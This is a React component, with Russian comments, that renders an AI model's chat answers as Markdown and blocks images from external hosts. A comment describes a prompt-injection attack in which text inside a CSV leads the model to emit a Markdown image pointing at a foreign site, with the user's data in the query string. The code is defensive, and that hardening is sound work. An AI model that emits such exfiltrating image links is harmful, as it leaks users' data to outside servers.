import ReactMarkdown from "react-markdown";
import remarkGfm from "remark-gfm";

const API_BASE = (import.meta.env.VITE_API_URL || "").replace(/\/$/, "");

// Своё изображение: путь вида /agent/artifacts/... (относительный или на адресе API).
function isOwnImage(src) {
  if (typeof src !== "string") return false;
  if (src.startsWith("/agent/artifacts/")) return true;
  return API_BASE !== "" && src.startsWith(`${API_BASE}/agent/artifacts/`);
}

// Ссылки из ответов открываем в новой вкладке и без передачи referrer.
const components = {
  // eslint-disable-next-line no-unused-vars
  a: ({ node, ...props }) => (
    <a {...props} target="_blank" rel="noopener noreferrer nofollow" />
  ),
  // Картинки из ответа: показываем только файлы нашего сервера (графики).
  // Внешние адреса не загружаем: из-за инъекции в тексте CSV модель могла бы вставить
  // ![](https://чужой-сайт/?данные), и браузер отправил бы данные на чужой сервер.
  // eslint-disable-next-line no-unused-vars
  img: ({ node, alt, src, ...props }) =>
    isOwnImage(src) ? (
      <a href={src} target="_blank" rel="noopener noreferrer">
        <img {...props} src={src} alt={alt ?? ""} loading="lazy" />
      </a>
    ) : (
      <span className="md-img-blocked">[изображение: {alt || "внешний источник"}]</span>
    ),
  // Широкие таблицы прокручиваются внутри собственной обёртки, а не ломают чат.
  // eslint-disable-next-line no-unused-vars
  table: ({ node, ...props }) => (
    <div className="md-table">
      <table {...props} />
    </div>
  ),
};

// Сырой HTML в тексте не исполняется (react-markdown по умолчанию выводит его как текст),
// поэтому ответ модели нельзя использовать для внедрения скриптов.
export default function Markdown({ children }) {
  return (
    <div className="markdown">
      <ReactMarkdown remarkPlugins={[remarkGfm]} components={components}>
        {children}
      </ReactMarkdown>
    </div>
  );
}
